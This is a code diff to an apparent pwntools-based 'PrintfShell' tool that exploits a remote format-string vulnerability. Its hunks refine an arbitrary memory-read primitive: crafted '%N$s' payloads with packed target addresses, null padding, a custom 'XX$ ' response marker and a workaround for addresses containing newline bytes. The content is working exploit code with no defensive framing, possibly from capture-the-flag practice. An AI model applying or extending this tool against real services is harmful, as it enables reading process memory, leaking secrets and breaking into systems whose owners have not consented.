@@ -42,6 +42,7 @@ class PrintfShell(shell.Shell):
         self.conn.recvuntil(self.marker)
         self.stack_base = None
         self.stack_offset = None
+        self.format_location = None
         print(self.conn)
     
     def read_response(self, string, marker=None):
@@ -49,8 +50,8 @@ class PrintfShell(shell.Shell):
             marker = self.marker
         string = self.write(string)
         self.conn.send(string)
-        resp = self.conn.recvuntil(self.marker)
-        return self.read(resp[:-len(self.marker)])
+        resp = self.conn.recvuntil(marker)
+        return self.read(resp[:-len(marker)])
     
     @Command
     def show_stack(self, n : int):
@@ -128,7 +129,7 @@ class PrintfShell(shell.Shell):
             print("need to set the stack offset `set_offset`")
             return  
         def read_command(stack_offset):
-            command = bytes(f"%{self.stack_offset+stack_offset}$s", "ascii")
+            command = bytes(f"%{self.stack_offset+stack_offset}$sXX", "ascii")
             padn = (8 - len(command) % 8) % 8
             pad = b"\x00"*padn
             return command + pad
@@ -139,6 +140,11 @@ class PrintfShell(shell.Shell):
         while len(all_bytes) < n:
             suffix = pwnlib.util.packing.p64(addr + offset)
             if b"\x0a" in suffix:
+                if self.format_location is None:
+                    print("Skipping 0xa location")
+                    all_bytes += b"\x00"
+                    offset += 1
+                    continue
                 # 4 (1) target_address (contains 0xa's)
                 # 3 JUNKJUNK # newlines of write
                 # 2 address of (1)
@@ -159,7 +165,7 @@ class PrintfShell(shell.Shell):
                 command = read_command(4)
             else:
                 command = read_command(1) + suffix
-            res = self.read_response(command)
+            res = self.read_response(command, marker="XX$ ")
             res = res + b"\x00"
             all_bytes += res
             offset = len(all_bytes)
